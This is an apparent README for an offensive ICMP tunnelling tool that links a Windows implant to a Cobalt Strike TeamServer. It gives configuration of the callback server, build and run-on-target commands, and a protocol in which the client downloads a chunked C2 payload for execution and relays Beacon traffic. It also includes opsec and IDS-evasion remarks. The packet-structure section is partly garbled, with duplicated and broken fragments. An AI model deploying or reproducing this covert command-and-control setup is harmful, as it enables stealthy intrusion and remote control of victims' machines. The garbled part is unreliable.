## Key Concepts

- **ICMP Echo Request (Type 8)**: Used by the client (“agent”) to signal the server (“controller”) and request data.
- **ICMP Echo Reply (Type 0)**: Used by the controller to embed and send replies (including large payloads) back to the client.
- **TAG (4 bytes)**: A fixed 4‐byte marker (e.g. `RQ47`) prepended to every ICMP payload, so that unrelated OS pings or network noise are ignored.
- **ICMP_PAYLOAD_SIZE (default 1000 bytes)**: Defines how many bytes we can carry in each ICMP packet’s data‐field. In both `controller.py` and `client_x86.c`, this is set to 1000 by default.  
    > Opsec: Windows default payload size is 32 bytes, where UNIX is 52. 
- **Chunking**: When the controller needs to send more data than fits in a single ICMP payload (1000 bytes), it splits the payload into fragments of up to **996** bytes each (ICMP_PAYLOAD_SIZE – TAG_SIZE = 1000 – 4). Each fragment still carries the same 4‐byte tag.

# Setup:

1. **Install dependencies:**

   ```bash
   sudo apt install libpcap0.8-dev
   ```

   ```bash
   pip install -r Controller/Python/requirements.txt
   ```

2. **Start an External C2 beacon in Cobalt Strike (TeamServer).**

3. **Edit the following fields in these files to fit your enviornment:**

   - **`Controller/Python/controller.py`:**
     ```python
     TEAMSERVER_IP   = "10.10.10.21"  # Change to your TeamServer’s IP (e.g. 127.0.0.1 if running locally)
     TEAMSERVER_PORT = 2222          # Change to TeamServer’s listening port
     # (These must stay in sync with how your Beacon is configured.)
     ICMP_TAG = "RQ47"              # The ICMP tag, MUST match client

     BEACON_PIPENAME = "foobar"     # Name of pipe to communicate over between the Beacon & Client
     BEACON_ARCH = "x86"            # what architecture is the client - used for payload generation
     ```
   - **`client_x86.c`:**
     ```c
     #define ICMP_CALLBACK_SERVER "172.19.241.197"  // Change to your Controller’s IP
     #define ICMP_PAYLOAD_SIZE      1000           // Must match controller.py‘s ICMP_PAYLOAD_SIZE
     #define ICMP_TAG               "RQ47"         // 4‐byte tag (can be changed, but must match controller)
     #define PIPENAME               "\\\\.\\pipe\\foobar"  // Named pipe as configured by the Controller’s pipename
     ```

   There are other tunable constants in both files (e.g. `SLEEP_TIME` in the client, `PIPENAME`, etc.). Review each file’s top‐section comments for details.

4. **Compile the client (Windows build target):**

   ```bash
   i686-w64-mingw32-gcc client_x86.c -o client_x86.exe -lws2_32
   ```
   > You may also try a 64-bit MinGW compile (`x86_64-w64-mingw32-gcc ...`) but only the 32-bit build has been fully tested.

5. **disable host ICMP repsonses**

    This prevents incorrect ICMP responses from getting sent back from the host, instead of the ICMP listener.

   > Note, this effectively disables any normal pings to the server, it looks to be possible to have the Controller respond back to normal/non-implant pings, however I haven't implemented that yet. 

   ```bash
   sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1
   ```

7. **Run the controller:**

   ```bash
   python3 Controller/Python/controller.py
   ```

8. **Run the compiled client on the target:**

   ```bash
   client_x86.exe
   ```

## Overall Flow

1. **Client: “Seq 0” Size Request**  
   - The client opens a raw ICMP socket.  
   - It builds an ICMP Echo Request (Type 8) whose payload is:
     ```
     [TAG (4 bytes)] [4-byte big-endian integer: total_bytes_expected]
     ```
     and sends it with **sequence number 0**.  
   - Purpose: inform the controller how many bytes of data it plans to receive.

2. **Controller: Immediate “Seq 0” Reply (Size Confirmation)**  
   - The controller’s sniffer sees an ICMP packet where:
     - Type == 8 (Echo Request)  
     - Payload starts with `TAG`  
     - Sequence == 0  
   - It extracts the 4-byte length, allocates a receive buffer of that size, and immediately responds with an ICMP Echo Reply (Type 0), also with **sequence 0**. Its payload is:
     ```
     [TAG (4 bytes)] [4-byte big-endian integer: total_bytes_to_send]
     ```
   - This confirms to the client that the server is ready to send exactly that many bytes.

3. **Controller: Sending Data Fragments (Seq 1…N)**  
   - If the data to send exceeds **1000 bytes**, the controller splits it into fragments of up to **996** bytes each (ICMP_PAYLOAD_SIZE – TAG_SIZE).  
   - For each fragment **i** (starting at 1), the controller sends an ICMP Echo Reply (Type 0) with:
     ```text
     Sequence = i
     Payload  = [TAG][next 996 bytes of data]
     ```
   - If the full payload fits within one chunk (≤ 996 bytes of data), only **seq 1** is used. Otherwise, multiple replies arrive in sequence.

4. **Client: Reassembly Loop**  
   - After sending “seq 0” and waiting, the client’s raw socket filters incoming packets, accepting only:
     - ICMP packets of Type 0 (Echo Reply)  
     - Matching its own process ID  
     - Payload beginning with `TAG`  
   - When **seq 0** arrives, the client reads the 4-byte length, allocates a buffer, and computes how many fragments it expects:
     ```
     data_per_chunk = ICMP_PAYLOAD_SIZE – TAG_SIZE  # = 1000 – 4 = 996
     total_chunks   = ceil(total_size / 996)
     ```
   - For each subsequent reply **seq = 1…total_chunks**, the client copies the data portion (i.e., the bytes after the 4-byte TAG) into the correct offset in the buffer. Once all fragments are received, the full payload is ready for execution or further processing.

5. **Beaconing & TeamServer Forwarding (Seq > 0)**  
   - After the initial C2 payload, the client may send extra frames (e.g., Beacon or task data). Each of these is sent as an ICMP Echo Request (Type 8) with:
     ```
     Sequence = X (> 0)
     Payload  = [TAG][user_data…]
     ```
   - The controller, upon spotting **seq > 0**, strips `TAG` and forwards the remaining bytes to the TeamServer over a TCP socket.  
   - Any response from the TeamServer is sent back in a single ICMP Echo Reply (Type 0) with:
     ```
     Sequence = X
     Payload  = [TAG][TeamServer_response]
     ```
   - This ensures a 1:1 mapping of in‐flight Beacon frames to replies, using the same sequence number to correlate.

## Packet Structure Summary

> **Constants** (both sides):
> ```text
> ICMP_PAYLOAD_SIZE = 1000      # bytes available for data+TAG
> TAG_SIZE          = 4         # bytes (e.g. “RQ47”)
> MAX_DATA_PER_CHUNK = 1000 – 4 = 996  # actual data per chunk
> ```
>
> **Note**: The 4-byte TAG is always the first 4 bytes of every payload, so each chunk’s data is at most 996 bytes.

- **Client → Controller (Seq 0)**  
  ```text
  IP Header      : 20 bytes
    └─ ICMP Header  : 8 bytes   (Type=8, Code=0, ID=<PID>, Seq=0)
        └─ Payload   : 1000 bytes total
              [ “RQ47” ][ 4-byte total_size ][ padding… (up to 992 bytes) ]
  ```

        └─ Payload   : 1000 bytes total
              [ “RQ47” ][ 4-byte total_size ][ padding… (up to 992 bytes) ]
  ```

    └─ ICMP Header  : 8 bytes   (Type=0, Code=0, ID=<PID>, Seq=i)
        └─ Payload   : ≤ 1000 bytes
              [ “RQ47” ][ up to 996 bytes of data ]
  ```

- **Client → Controller (Seq i Request, after C2 payload)**  
  ```text
  IP Header      : 20 bytes
    └─ ICMP Header  : 8 bytes   (Type=8, Code=0, ID=<PID>, Seq=i)
        └─ Payload   : ≤ 1000 bytes
              [ “RQ47” ][ up to 996 bytes of Beacon/command data ]
  ```

- **Controller → Client (Seq i Reply, TeamServer data)**  
  ```text
  IP Header      : 20 bytes
    └─ ICMP Header  : 8 bytes   (Type=0, Code=0, ID=<PID>, Seq=i)
        └─ Payload   : ≤ 1000 bytes
              [ “RQ47” ][ TeamServer response data ]
  ```

<!-- ## Advantages & Caveats

- **Quietness**: Leverages legitimate ICMP traffic.
- **Minimal Dependencies**: Only raw sockets (client) and basic Scapy (controller) are needed.
- **Fragility**: No built-in session encryption or integrity checks—relying solely on the 4-byte TAG for filtering.
- **IDS/Firewall Risk**: Large or unusual ICMP payloads may trigger alerts. We chunk at 996 bytes to avoid IP‐level fragmentation, but the TAG may still look suspicious.

## Usage Notes

1. **Client setup**: Must run as an administrator (Windows) to open a raw ICMP socket, or as root (Linux) if you port the code there.
2. **Controller setup**: Needs elevated privileges to sniff/send raw ICMP (via Scapy).
3. **Tag matching**: Both sides ignore any ICMP not starting with `RQ47`. This prevents OS‐generated pings from disrupting the reassembly logic.
4. **Timeouts**: The client’s `recv_icmp_fragments()` has no explicit timeout per‐packet, so if fragments never arrive, it will block indefinitely. You may want to add a `setsockopt(..., SO_RCVTIMEO, ...)` or similar.
5. **TeamServer traffic**: After the initial C2 payload is delivered, any “seq > 0” ICMP Echo Requests are forwarded to the TeamServer over a plain TCP connection; replies come back in Echo Replies.
